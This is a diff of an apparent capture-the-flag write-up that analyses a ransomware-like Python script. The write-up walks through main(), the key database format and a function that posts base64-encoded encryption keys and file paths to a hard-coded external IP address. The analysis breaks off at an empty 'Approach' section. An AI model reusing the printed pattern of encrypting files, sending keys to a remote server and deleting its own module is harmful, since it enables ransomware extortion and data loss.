@@ -84,10 +84,49 @@ This is likely the script that was used to encrypt the above files.
 
 ## Analysis of the Encryption Script
 
+Let's start with taking a look at function `main()`.
+
+### Function *main()*
+
 ```python
 [...]
 from encrypter import *
+[...]
+def main():
+    paths = generate_path_list()
+    # Encrypt data with military-grade AES-GCM
+    encrypted_data = encrypt_files(paths)
+    # Delete encryption module to anger security researchers
+    os.remove("encrypter.py")
+    write_files(encrypted_data)
+    key_db = get_encrypted_key_db(encrypted_data)
+    write_key_db(key_db)
+```
 
+We don't know the functionality that is imported from the (actor) module `encrypter`, as it was deleted (*angry face*). Since there are no other references we can recognize, we assume that the functions `generate_path_list()`, `encrypted_files()` and `write_files()` were imported from `encrypter`.
+
+- `generate_path_list()` sounds like it may return a list of file path strings to encrypt.
+- `encrypt_files()` is - according to the comment - applying *military-grade* AES-GCM to encrypt the data.
+  - Whatever data structure is returned from it, it is assigned to `encrypted_data` which is used as an argument for function `write_files()`.
+- `write_files()` will likely write the encrypted data to disk.
+
+Afterwards two functions are called that are defined in the supplied script: `get_encrypted_key_db()` and `write_key_db()`.
+
+### Function *write_key_db()*
+
+No magic here. This is the culprit to generate file `keys.db`.
+
+```python
+def write_key_db(data):
+    with open("keys.db", "wb") as h:
+        h.write(data)
+```
+
+### Function *get_encrypted_key_db()*
+
+Let's inspect the code here.
+
+```python
 def get_encrypted_key_db(data):
     encoded_data = bytearray()
     for _, key, path in data:
@@ -99,24 +138,32 @@ def get_encrypted_key_db(data):
         encoded_data += b"\x00\x00\x00\x00"
     res = requests.post("http://116.202.161.100:57689/encrypt_db", data=b64encode(encoded_data))
     return b64decode(res.text)
-
-def write_key_db(data):
-    with open("keys.db", "wb") as h:
-        h.write(data)
-
-def main():
-    paths = generate_path_list()
-    # Encrypt data with military-grade AES-GCM
-    encrypted_data = encrypt_files(paths)
-    # Delete encryption module to anger security researchers
-    os.remove("encrypter.py")
-    write_files(encrypted_data)
-    key_db = get_encrypted_key_db(encrypted_data)
-    write_key_db(key_db)
-
-if __name__ == "__main__":
-    main()
 ```
+
+This is actually the only function/code part that we can seriously work on. This is the generator function for the contents of file `keys.db`. Maybe we can spot a weakness in the logic in order to retrieve (parts of) the crypto material needed for decryption.
+
+The function iterates over list entries of the variable `data`, which is the function's first and only argument. `main()` passed `encrypted_data` to it.
+
+Each list entry (of `encrypted_data`) seems to be composed of three parts: `_, key, path`.
+
+For each list entry, a data structure is appended to `encoded_data`.
+
+| Offset | Length | Value | Comment |
+| --- | --- | --- | --- |
+| 0 | 4 | unknown | Length of *key*, Byte order: Little endian |
+| 4 | unknown | unknown | Key length could be 16, 24 or 32 Byte |
+| unknown | 4 | "\x00" * 4 | Some sort of padding |
+| unknown | 4 | unknown | Length of file path, Little endian |
+| unknown | unknown | unknown | File path string |
+| unknown | 4 | "\x00" * 4 | Some sort of padding |
+
+Then an HTTP POST request is made to `http://116.202.161.100:57689/encrypt_db` with the base64 encoded value of `encoded_data`.
+
+The result is base64 decoded, return to `main()` and then written to our `keys.db`.
+
+## Approach
+
+
 
 
 
